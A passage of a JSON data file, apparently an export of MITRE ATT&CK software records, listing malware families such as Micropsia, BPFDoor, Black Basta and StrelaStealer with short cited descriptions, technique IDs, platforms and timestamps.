        "T1033",
        "T1036.005",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0015",
      "stix_id": "malware--8beac7c2-48d2-4cd9-9b15-6c452f38ac06",
      "created": "2017-05-31T21:32:16.360000+00:00",
      "modified": "2024-11-17T16:12:58.245000+00:00"
    },
    "S0339": {
      "id": "S0339",
      "name": "Micropsia",
      "description": "[Micropsia](https://attack.mitre.org/software/S0339) is a remote access tool written in Delphi.(Citation: Talos Micropsia June 2017)(Citation: Radware Micropsia July 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1119",
        "T1518.001",
        "T1056.001",
        "T1083",
        "T1059.003",
        "T1547.009",
        "T1033",
        "T1105",
        "T1560.001",
        "T1071.001",
        "T1027.013",
        "T1113",
        "T1123",
        "T1564.001",
        "T1047"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0339",
      "stix_id": "malware--8c050cea-86e1-4b63-bf21-7af4fa483349",
      "created": "2019-01-29T21:47:53.070000+00:00",
      "modified": "2024-10-04T11:08:25.923000+00:00"
    },
    "S0585": {
      "id": "S0585",
      "name": "Kerrdown",
      "description": "[Kerrdown](https://attack.mitre.org/software/S0585) is a custom downloader that has been used by [APT32](https://attack.mitre.org/groups/G0050) since at least 2018 to install spyware from a server on the victim's network.(Citation: Amnesty Intl. Ocean Lotus February 2021)(Citation: Unit 42 KerrDown February 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1566.002",
        "T1059.005",
        "T1566.001",
        "T1027.013",
        "T1082",
        "T1574.001",
        "T1105",
        "T1027.015",
        "T1140",
        "T1204.002",
        "T1204.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0585",
      "stix_id": "malware--8c1d01ff-fdc0-4586-99bd-c248e0761af5",
      "created": "2021-03-02T13:38:32.673000+00:00",
      "modified": "2025-04-25T14:43:59.023000+00:00"
    },
    "S0055": {
      "id": "S0055",
      "name": "RARSTONE",
      "description": "[RARSTONE](https://attack.mitre.org/software/S0055) is malware used by the [Naikon](https://attack.mitre.org/groups/G0019) group that has some characteristics similar to [PlugX](https://attack.mitre.org/software/S0013). (Citation: Aquino RARSTONE)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1055.001",
        "T1095",
        "T1083",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0055",
      "stix_id": "malware--8c553311-0baa-4146-997a-f79acef3d831",
      "created": "2017-05-31T21:32:38.480000+00:00",
      "modified": "2025-04-25T14:43:59.385000+00:00"
    },
    "S0442": {
      "id": "S0442",
      "name": "VBShower",
      "description": "[VBShower](https://attack.mitre.org/software/S0442) is a backdoor that has been used by [Inception](https://attack.mitre.org/groups/G0100) since at least 2019. [VBShower](https://attack.mitre.org/software/S0442) has been used as a downloader for second stage payloads, including [PowerShower](https://attack.mitre.org/software/S0441).(Citation: Kaspersky Cloud Atlas August 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.005",
        "T1070.004",
        "T1547.001",
        "T1071.001",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0442",
      "stix_id": "malware--8caa18af-4758-4fd3-9600-e8af579e89ed",
      "created": "2020-05-08T20:43:25.743000+00:00",
      "modified": "2025-04-25T14:43:59.751000+00:00"
    },
    "S1161": {
      "id": "S1161",
      "name": "BPFDoor",
      "description": "[BPFDoor](https://attack.mitre.org/software/S1161) is a Linux based passive long-term backdoor used by China-based threat actors. First seen in 2021, [BPFDoor](https://attack.mitre.org/software/S1161) is named after its usage of Berkley Packet Filter (BPF) to execute single task instructions. [BPFDoor](https://attack.mitre.org/software/S1161) supports multiple protocols for communicating with a C2 including TCP, UDP, and ICMP and can start local or reverse shells that bypass firewalls using iptables.(Citation: Sandfly BPFDoor 2022)(Citation: Deep Instinct BPFDoor 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070",
        "T1480.002",
        "T1480",
        "T1036.011",
        "T1562.003",
        "T1205.002",
        "T1564.011",
        "T1036.009",
        "T1070.004",
        "T1562.004",
        "T1070.006",
        "T1059.004",
        "T1027"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S1161",
      "stix_id": "malware--8d1f89fd-4dde-40ab-80e0-a7b80249162e",
      "created": "2024-09-20T23:08:38.199000+00:00",
      "modified": "2025-01-03T18:03:04.670000+00:00"
    },
    "S1070": {
      "id": "S1070",
      "name": "Black Basta",
      "description": "[Black Basta](https://attack.mitre.org/software/S1070) is ransomware written in C++ that has been offered within the ransomware-as-a-service (RaaS) model since at least April 2022; there are variants that target Windows and VMWare ESXi servers. [Black Basta](https://attack.mitre.org/software/S1070) operations have included the double extortion technique where in addition to demanding ransom for decrypting the files of targeted organizations the cyber actors also threaten to post sensitive information to a leak site if the ransom is not paid. [Black Basta](https://attack.mitre.org/software/S1070) affiliates have targeted multiple high-value organizations, with the largest number of victims based in the U.S. Based on similarities in TTPs, leak sites, payment sites, and negotiation tactics, security researchers assess the [Black Basta](https://attack.mitre.org/software/S1070) RaaS operators could include current or former members of the [Conti](https://attack.mitre.org/software/S0575) group.(Citation: Palo Alto Networks Black Basta August 2022)(Citation: Deep Instinct Black Basta August 2022)(Citation: Minerva Labs Black Basta May 2022)(Citation: Avertium Black Basta June 2022)(Citation: NCC Group Black Basta June 2022)(Citation: Cyble Black Basta May 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1490",
        "T1082",
        "T1562.009",
        "T1553.002",
        "T1497",
        "T1491.001",
        "T1018",
        "T1112",
        "T1083",
        "T1486",
        "T1622",
        "T1204.002",
        "T1222.002",
        "T1059.003",
        "T1007",
        "T1497.001",
        "T1059.001",
        "T1543.003",
        "T1047",
        "T1027.001",
        "T1106",
        "T1529",
        "T1036.005",
        "T1480.002",
        "T1036.004"
      ],
      "platforms": [
        "Windows",
        "ESXi"
      ],
      "url": "https://attack.mitre.org/software/S1070",
      "stix_id": "malware--8d242fb4-9033-4f13-8a88-4b9b4bcd9a53",
      "created": "2023-03-08T19:14:27.348000+00:00",
      "modified": "2025-04-15T19:12:30.748000+00:00"
    },
    "S1151": {
      "id": "S1151",
      "name": "ZeroCleare",
      "description": "[ZeroCleare](https://attack.mitre.org/software/S1151) is a wiper malware that has been used in conjunction with the [RawDisk](https://attack.mitre.org/software/S0364) driver since at least 2019 by suspected Iran-nexus threat actors including activity targeting the energy and industrial sectors in the Middle East and political targets in Albania.(Citation: Microsoft Albanian Government Attacks September 2022)(Citation: CISA Iran Albanian Attacks September 2022)(Citation: Mandiant ROADSWEEP August 2022)(Citation: IBM ZeroCleare Wiper December 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1068",
        "T1553.002",
        "T1059",
        "T1106",
        "T1070.004",
        "T1059.001",
        "T1561.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1151",
      "stix_id": "malware--8d8518db-0f52-4f3c-8017-01389a8522bb",
      "created": "2024-08-08T19:52:06.393000+00:00",
      "modified": "2024-09-04T19:16:36.655000+00:00"
    },
    "S0261": {
      "id": "S0261",
      "name": "Catchamas",
      "description": "[Catchamas](https://attack.mitre.org/software/S0261) is a Windows Trojan that steals information from compromised systems. (Citation: Symantec Catchamas April 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1112",
        "T1056.001",
        "T1543.003",
        "T1016",
        "T1115",
        "T1074.001",
        "T1036.004",
        "T1010",
        "T1113"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0261",
      "stix_id": "malware--8d9e758b-735f-4cbc-ba7c-32cd15138b2a",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-11-17T18:36:16.203000+00:00"
    },
    "S0380": {
      "id": "S0380",
      "name": "StoneDrill",
      "description": "[StoneDrill](https://attack.mitre.org/software/S0380) is wiper malware discovered in destructive campaigns against both Middle Eastern and European targets in association with [APT33](https://attack.mitre.org/groups/G0064).(Citation: FireEye APT33 Sept 2017)(Citation: Kaspersky StoneDrill 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1497",
        "T1105",
        "T1070.004",
        "T1124",
        "T1055",
        "T1518.001",
        "T1047",
        "T1027.013",
        "T1082",
        "T1561.002",
        "T1012",
        "T1561.001",
        "T1059.005",
        "T1113",
        "T1485"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0380",
      "stix_id": "malware--8dbadf80-468c-4a62-b817-4e4d8b606887",
      "created": "2019-05-14T15:05:06.630000+00:00",
      "modified": "2024-04-11T00:00:54.356000+00:00"
    },
    "S0264": {
      "id": "S0264",
      "name": "OopsIE",
      "description": "[OopsIE](https://attack.mitre.org/software/S0264) is a Trojan used by [OilRig](https://attack.mitre.org/groups/G0049) to remotely execute commands as well as upload/download files to/from victims. (Citation: Unit 42 OopsIE! Feb 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1074.001",
        "T1030",
        "T1140",
        "T1070.004",
        "T1047",
        "T1132.001",
        "T1082",
        "T1497.001",
        "T1071.001",
        "T1059.003",
        "T1560.003",
        "T1105",
        "T1059.005",
        "T1560.001",
        "T1053.005",
        "T1027.002",
        "T1124",
        "T1027",
        "T1041"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0264",
      "stix_id": "malware--8e101fdd-9f7f-4916-bb04-6bd9e94c129c",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:44:01.012000+00:00"
    },
    "S0065": {
      "id": "S0065",
      "name": "4H RAT",
      "description": "[4H RAT](https://attack.mitre.org/software/S0065) is malware that has been used by [Putter Panda](https://attack.mitre.org/groups/G0024) since at least 2007. (Citation: CrowdStrike Putter Panda)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1082",
        "T1059.003",
        "T1071.001",
        "T1573.001",
        "T1057"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0065",
      "stix_id": "malware--8e461ca3-0996-4e6e-a0df-e2a5bbc51ebc",
      "created": "2017-05-31T21:32:43.664000+00:00",
      "modified": "2025-04-25T14:44:01.375000+00:00"
    },
    "S0270": {
      "id": "S0270",
      "name": "RogueRobin",
      "description": "[RogueRobin](https://attack.mitre.org/software/S0270) is a payload used by [DarkHydrus](https://attack.mitre.org/groups/G0079) that has been developed in PowerShell and C#. (Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit42 DarkHydrus Jan 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.009",
        "T1047",
        "T1105",
        "T1016",
        "T1218.010",
        "T1033",
        "T1027.010",
        "T1132.001",
        "T1102.002",
        "T1059.003",
        "T1497.001",
        "T1518.001",
        "T1057",
        "T1082",
        "T1059.001",
        "T1113",
        "T1140",
        "T1547.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0270",
      "stix_id": "malware--8ec6e3b4-b06d-4805-b6aa-af916acc2122",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-16T20:38:22.307000+00:00"
    },
    "S0438": {
      "id": "S0438",
      "name": "Attor",
      "description": "[Attor](https://attack.mitre.org/software/S0438) is a Windows-based espionage platform that has been seen in use since 2013. [Attor](https://attack.mitre.org/software/S0438) has a loadable plugin architecture to customize functionality for specific targets.(Citation: ESET Attor Oct 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1560.003",
        "T1010",
        "T1573.001",
        "T1036.004",
        "T1497.001",
        "T1090.003",
        "T1037.001",
        "T1218.011",
        "T1115",
        "T1573.002",
        "T1105",
        "T1074.001",
        "T1120",
        "T1112",
        "T1113",
        "T1041",
        "T1129",
        "T1543.003",
        "T1027.013",
        "T1071.002",
        "T1119",
        "T1053.005",
        "T1070.006",
        "T1055",
        "T1056.001",
        "T1569.002",
        "T1564.001",
        "T1070.004",
        "T1123",
        "T1106",
        "T1020",
        "T1055.004",
        "T1082",
        "T1012"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0438",
      "stix_id": "malware--8f423bd7-6ca7-4303-9e85-008c7ad5fdaa",
      "created": "2020-05-06T20:26:15.141000+00:00",
      "modified": "2024-04-11T02:57:38.076000+00:00"
    },
    "S0243": {
      "id": "S0243",
      "name": "DealersChoice",
      "description": "[DealersChoice](https://attack.mitre.org/software/S0243) is a Flash exploitation framework used by [APT28](https://attack.mitre.org/groups/G0007). (Citation: Sofacy DealersChoice)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1203",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0243",
      "stix_id": "malware--8f460983-1bbb-4e7e-8094-f0b5e720f658",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:44:02.087000+00:00"
    },
    "S0390": {
      "id": "S0390",
      "name": "SQLRat",
      "description": "[SQLRat](https://attack.mitre.org/software/S0390) is malware that executes SQL scripts to avoid leaving traditional host artifacts. [FIN7](https://attack.mitre.org/groups/G0046) has been observed using it.(Citation: Flashpoint FIN 7 March 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1059.003",
        "T1105",
        "T1204.002",
        "T1027.010",
        "T1140",
        "T1053.005",
        "T1059.001"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0390",
      "stix_id": "malware--8fc6c9e7-a162-4ca4-a488-f1819e9a7b06",
      "created": "2019-06-18T18:40:33.671000+00:00",
      "modified": "2025-04-16T20:38:22.655000+00:00"
    },
    "S0680": {
      "id": "S0680",
      "name": "LitePower",
      "description": "[LitePower](https://attack.mitre.org/software/S0680) is a downloader and second stage malware that has been used by [WIRTE](https://attack.mitre.org/groups/G0090) since at least 2021.(Citation: Kaspersky WIRTE November 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1105",
        "T1012",
        "T1059.001",
        "T1113",
        "T1106",
        "T1071.001",
        "T1041",
        "T1053.005",
        "T1518.001",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0680",
      "stix_id": "malware--9020f5c7-efde-4125-a4f1-1b70f1274ddd",
      "created": "2022-02-02T14:57:58.026000+00:00",
      "modified": "2025-04-16T20:38:22.811000+00:00"
    },
    "S0576": {
      "id": "S0576",
      "name": "MegaCortex",
      "description": "[MegaCortex](https://attack.mitre.org/software/S0576) is ransomware that first appeared in May 2019. (Citation: IBM MegaCortex) [MegaCortex](https://attack.mitre.org/software/S0576) has mainly targeted industrial organizations. (Citation: FireEye Ransomware Disrupt Industrial Production)(Citation: FireEye Financial Actors Moving into OT)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1218.011",
        "T1497.001",
        "T1588.003",
        "T1531",
        "T1490",
        "T1562.001",
        "T1083",
        "T1055.001",
        "T1489",
        "T1112",
        "T1561.001",
        "T1486",
        "T1059.003",
        "T1140",
        "T1106",
        "T1134"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0576",
      "stix_id": "malware--909617c3-6d87-4330-8f32-bd3af38c3b92",
      "created": "2021-02-17T20:27:27.222000+00:00",
      "modified": "2025-03-10T19:49:50.935000+00:00"
    },
    "S0142": {
      "id": "S0142",
      "name": "StreamEx",
      "description": "[StreamEx](https://attack.mitre.org/software/S0142) is a malware family that has been used by [Deep Panda](https://attack.mitre.org/groups/G0009) since at least 2015. In 2016, it was distributed via legitimate compromised Korean websites. (Citation: Cylance Shell Crew Feb 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1218.011",
        "T1543.003",
        "T1112",
        "T1082",
        "T1083",
        "T1518.001",
        "T1027",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0142",
      "stix_id": "malware--91000a8a-58cc-4aba-9ad0-993ad6302b86",
      "created": "2017-05-31T21:33:21.437000+00:00",
      "modified": "2025-04-25T14:44:02.994000+00:00"
    },
    "S0651": {
      "id": "S0651",
      "name": "BoxCaon",
      "description": "[BoxCaon](https://attack.mitre.org/software/S0651) is a Windows backdoor that was used by [IndigoZebra](https://attack.mitre.org/groups/G0136) in a 2021 spearphishing campaign against Afghan government officials. [BoxCaon](https://attack.mitre.org/software/S0651)'s name stems from similarities shared with the malware family [xCaon](https://attack.mitre.org/software/S0653).(Citation: Checkpoint IndigoZebra July 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1102.002",
        "T1059.003",
        "T1083",
        "T1105",
        "T1106",
        "T1005",
        "T1041",
        "T1547",
        "T1567.002",
        "T1027",
        "T1016",
        "T1074.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0651",
      "stix_id": "malware--919a056e-5104-43b9-ad55-2ac929108b71",
      "created": "2021-09-27T20:50:56.335000+00:00",
      "modified": "2025-04-25T14:44:03.536000+00:00"
    },
    "S1090": {
      "id": "S1090",
      "name": "NightClub",
      "description": "[NightClub](https://attack.mitre.org/software/S1090) is a modular implant written in C++ that has been used by [MoustachedBouncer](https://attack.mitre.org/groups/G1019) since at least 2014.(Citation: MoustachedBouncer ESET August 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1543.003",
        "T1041",
        "T1036.005",
        "T1005",
        "T1106",
        "T1083",
        "T1071.004",
        "T1070.006",
        "T1132.002",
        "T1071.003",
        "T1036.004",
        "T1010",
        "T1056.001",
        "T1113",
        "T1105",
        "T1027",
        "T1057",
        "T1120",
        "T1123",
        "T1074.001",
        "T1112"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1090",
      "stix_id": "malware--91c57ed3-7c32-4c68-b388-7db00cb8dac6",
      "created": "2023-09-27T19:32:52.140000+00:00",
      "modified": "2023-09-27T19:33:24.323000+00:00"
    },
    "S0538": {
      "id": "S0538",
      "name": "Crutch",
      "description": "[Crutch](https://attack.mitre.org/software/S0538) is a backdoor designed for document theft that has been used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2015.(Citation: ESET Crutch December 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1560.001",
        "T1120",
        "T1102.002",
        "T1071.001",
        "T1053.005",
        "T1567.002",
        "T1025",
        "T1036.004",
        "T1574.001",
        "T1020",
        "T1119",
        "T1005",
        "T1008",
        "T1074.001",
        "T1041"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0538",
      "stix_id": "malware--925a6c52-5cf0-4fec-99de-b0d6917d8593",
      "created": "2020-12-04T20:43:50.481000+00:00",
      "modified": "2025-04-25T14:44:04.068000+00:00"
    },
    "S1194": {
      "id": "S1194",
      "name": "Akira _v2",
      "description": "[Akira _v2](https://attack.mitre.org/software/S1194) is a Rust-based variant of [Akira](https://attack.mitre.org/software/S1129) ransomware that has been in use since at least 2024. [Akira _v2](https://attack.mitre.org/software/S1194) is designed to target VMware ESXi servers and includes a new command-line argument set and other expanded capabilities.(Citation: CISA Akira Ransomware APR 2024)(Citation: Cisco Akira Ransomware OCT 2024)(Citation: Palo Alto Howling Scorpius DEC 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1543",
        "T1654",
        "T1486",
        "T1083",
        "T1489",
        "T1480"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S1194",
      "stix_id": "malware--929d0d4d-b7c6-4ee8-81eb-43c849294e27",
      "created": "2025-01-09T18:38:40.311000+00:00",
      "modified": "2025-03-11T15:37:48.613000+00:00"
    },
    "S0461": {
      "id": "S0461",
      "name": "SDBbot",
      "description": "[SDBbot](https://attack.mitre.org/software/S0461) is a backdoor with installer and loader components that has been used by [TA505](https://attack.mitre.org/groups/G0092) since at least 2019.(Citation: Proofpoint TA505 October 2019)(Citation: IBM TA505 April 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1070",
        "T1140",
        "T1090",
        "T1546.011",
        "T1055.001",
        "T1218.011",
        "T1027.002",
        "T1614",
        "T1547.001",
        "T1005",
        "T1021.001",
        "T1105",
        "T1082",
        "T1125",
        "T1546.012",
        "T1016",
        "T1033",
        "T1095",
        "T1041",
        "T1057",
        "T1059.003",
        "T1027",
        "T1070.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0461",
      "stix_id": "malware--92b03a94-7147-4952-9d5a-b4d24da7487c",
      "created": "2020-06-01T12:29:05.241000+00:00",
      "modified": "2025-04-16T20:38:23.446000+00:00"
    },
    "S0256": {
      "id": "S0256",
      "name": "Mosquito",
      "description": "[Mosquito](https://attack.mitre.org/software/S0256) is a Win32 backdoor that has been used by [Turla](https://attack.mitre.org/groups/G0010). [Mosquito](https://attack.mitre.org/software/S0256) is made up of three parts: the installer, the launcher, and the backdoor. The main backdoor is called CommanderDLL and is launched by the loader program. (Citation: ESET Turla Mosquito Jan 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1047",
        "T1033",
        "T1218.011",
        "T1070.004",
        "T1573.001",
        "T1518.001",
        "T1059.001",
        "T1112",
        "T1105",
        "T1546.015",
        "T1027.013",
        "T1057",
        "T1016",
        "T1059.003",
        "T1547.001",
        "T1106",
        "T1027.011"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0256",
      "stix_id": "malware--92b55426-109f-4d93-899f-1833ce91ff90",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-04-11T00:38:26.326000+00:00"
    },
    "S0148": {
      "id": "S0148",
      "name": "RTM",
      "description": "[RTM](https://attack.mitre.org/software/S0148) is custom malware written in Delphi. It is used by the group of the same name ([RTM](https://attack.mitre.org/groups/G0048)). Newer versions of the malware have been reported publicly as Redaman.(Citation: ESET RTM Feb 2017)(Citation: Unit42 Redaman January 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1548.002",
        "T1219",
        "T1059.003",
        "T1115",
        "T1056.001",
        "T1568",
        "T1566.001",
        "T1027.015",
        "T1547.001",
        "T1120",
        "T1124",
        "T1559.002",
        "T1553.002",
        "T1497",
        "T1053.005",
        "T1036.004",
        "T1573.001",
        "T1112",
        "T1102.001",
        "T1106",
        "T1119",
        "T1033",
        "T1553.004",
        "T1071.001",
        "T1218.011",
        "T1571",
        "T1082",
        "T1105",
        "T1083",
        "T1027",
        "T1518.001",
        "T1204.002",
        "T1057",
        "T1518",
        "T1113",
        "T1070.009",
        "T1036",
        "T1070.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0148",
      "stix_id": "malware--92ec0cbd-2c30-44a2-b270-73f4ec949841",
      "created": "2017-05-31T21:33:26.565000+00:00",
      "modified": "2025-04-16T20:38:23.633000+00:00"
    },
    "S1076": {
      "id": "S1076",
      "name": "QUIETCANARY",
      "description": "[QUIETCANARY](https://attack.mitre.org/software/S1076) is a backdoor tool written in .NET that has been used since at least 2022 to gather and exfiltrate data from victim networks.(Citation: Mandiant Suspected Turla Campaign February 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.001",
        "T1140",
        "T1016",
        "T1564.003",
        "T1074",
        "T1106",
        "T1071.001",
        "T1012",
        "T1132.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1076",
      "stix_id": "malware--93289ecf-4d15-4d6b-a9c3-4ab27e145ef4",
      "created": "2023-05-19T20:18:52.141000+00:00",
      "modified": "2025-04-16T20:38:23.780000+00:00"
    },
    "S0021": {
      "id": "S0021",
      "name": "Derusbi",
      "description": "[Derusbi](https://attack.mitre.org/software/S0021) is malware used by multiple Chinese APT groups.(Citation: Novetta-Axiom)(Citation: ThreatConnect Anthem) Both Windows and Linux variants have been observed.(Citation: Fidelis Turbo)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1056.001",
        "T1059.004",
        "T1218.010",
        "T1082",
        "T1070.006",
        "T1055.001",
        "T1070.004",
        "T1571",
        "T1573.001",
        "T1033",
        "T1123",
        "T1083",
        "T1008",
        "T1095",
        "T1113",
        "T1125",
        "T1057",
        "T1012"
      ],
      "platforms": [
        "Windows",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0021",
      "stix_id": "malware--94379dec-5c87-49db-b36e-66abc0b81344",
      "created": "2017-05-31T21:32:18.668000+00:00",
      "modified": "2025-04-16T20:38:23.924000+00:00"
    },
    "S1180": {
      "id": "S1180",
      "name": "BlackByte Ransomware",
      "description": "[BlackByte Ransomware](https://attack.mitre.org/software/S1180) is uniquely associated with [BlackByte](https://attack.mitre.org/groups/G1043) operations. [BlackByte Ransomware](https://attack.mitre.org/software/S1180) used a common key for infections, allowing for the creation of a universal decryptor.(Citation: Trustwave BlackByte 2021)(Citation: FBI BlackByte 2022) [BlackByte Ransomware](https://attack.mitre.org/software/S1180) was replaced in [BlackByte](https://attack.mitre.org/groups/G1043) operations by [BlackByte 2.0 Ransomware](https://attack.mitre.org/software/S1181) by 2023.(Citation: Microsoft BlackByte 2023)(Citation: Cisco BlackByte 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1135",
        "T1486",
        "T1012",
        "T1059.007",
        "T1570",
        "T1082",
        "T1053.005",
        "T1490",
        "T1046",
        "T1027.013",
        "T1562.010",
        "T1106",
        "T1222.001",
        "T1112",
        "T1480",
        "T1140",
        "T1562.001",
        "T1021.002",
        "T1614.001",
        "T1518.001",
        "T1497.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1180",
      "stix_id": "malware--9454bb5d-3bdb-40f9-a878-b5fb446ded3d",
      "created": "2024-12-17T01:07:49.640000+00:00",
      "modified": "2024-12-17T02:00:37.437000+00:00"
    },
    "S0627": {
      "id": "S0627",
      "name": "SodaMaster",
      "description": "[SodaMaster](https://attack.mitre.org/software/S0627) is a fileless malware used by [menuPass](https://attack.mitre.org/groups/G0045) to download and execute payloads since at least 2020.(Citation: Securelist APT10 March 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1106",
        "T1497.001",
        "T1573.002",
        "T1497.003",
        "T1027",
        "T1033",
        "T1082",
        "T1573.001",
        "T1057",
        "T1012"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0627",
      "stix_id": "malware--94d6d788-07bb-4dcc-b62f-e02626b00108",
      "created": "2021-06-21T15:52:14.624000+00:00",
      "modified": "2025-04-25T14:44:05.856000+00:00"
    },
    "S0009": {
      "id": "S0009",
      "name": "Hikit",
      "description": "[Hikit](https://attack.mitre.org/software/S0009) is malware that has been used by [Axiom](https://attack.mitre.org/groups/G0001) for late-stage persistence and exfiltration after the initial compromise.(Citation: Novetta-Axiom)(Citation: FireEye Hikit Rootkit)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1566",
        "T1574.001",
        "T1573.001",
        "T1553.006",
        "T1059.003",
        "T1071.001",
        "T1553.004",
        "T1014",
        "T1090.001",
        "T1005",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0009",
      "stix_id": "malware--95047f03-4811-4300-922e-1ba937d53a61",
      "created": "2017-05-31T21:32:14.124000+00:00",
      "modified": "2024-11-17T15:43:38.148000+00:00"
    },
    "S1183": {
      "id": "S1183",
      "name": "StrelaStealer",
      "description": "[StrelaStealer](https://attack.mitre.org/software/S1183) is an information stealer malware variant first identified in November 2022 and active through late 2024. [StrelaStealer](https://attack.mitre.org/software/S1183) focuses on the automated identification, collection, and exfiltration of email credentials from email clients such as Outlook and Thunderbird.(Citation: DCSO StrelaStealer 2022)(Citation: PaloAlto StrelaStealer 2024)(Citation: Fortgale StrelaStealer 2023)(Citation: IBM StrelaStealer 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1001",
        "T1041",
        "T1027.016",
        "T1071.001",
        "T1622",
        "T1027",
        "T1553.002",
        "T1480",
        "T1036.003",
        "T1204.002",
        "T1027.013",
        "T1059.007",
        "T1218.011",
        "T1518",
        "T1027.002",
        "T1059.001",
        "T1059.003",
        "T1497",
        "T1566.001",
        "T1027.015",
        "T1552.002",
        "T1036",
        "T1132.001",
        "T1574.001",
        "T1036.005",
        "T1614.001",
        "T1140",
        "T1105",
        "T1480.002",
        "T1082",
        "T1552.001",
        "T1119",
        "T1036.008",
        "T1020"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1183",
      "stix_id": "malware--951313b3-6064-4ce0-b4b6-a153c3973da7",
      "created": "2024-12-31T16:12:44.473000+00:00",
      "modified": "2025-03-10T18:57:36.697000+00:00"
    },
    "S0531": {
      "id": "S0531",
      "name": "Grandoreiro",
      "description": "[Grandoreiro](https://attack.mitre.org/software/S0531) is a banking trojan written in Delphi that was first observed in 2016 and uses a Malware-as-a-Service (MaaS) business model. [Grandoreiro](https://attack.mitre.org/software/S0531) has confirmed victims in Brazil, Mexico, Portugal, and Spain.(Citation: Securelist Brazilian Banking Malware July 2020)(Citation: ESET Grandoreiro April 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.005",
        "T1204.001",
        "T1057",
        "T1547.009",
        "T1539",
        "T1105",
        "T1573.002",
        "T1102.001",
        "T1036.005",
        "T1112",
        "T1102.002",
        "T1041",
        "T1222.001",
        "T1027.013",
        "T1124",
        "T1547.001",
        "T1204.002",
        "T1033",
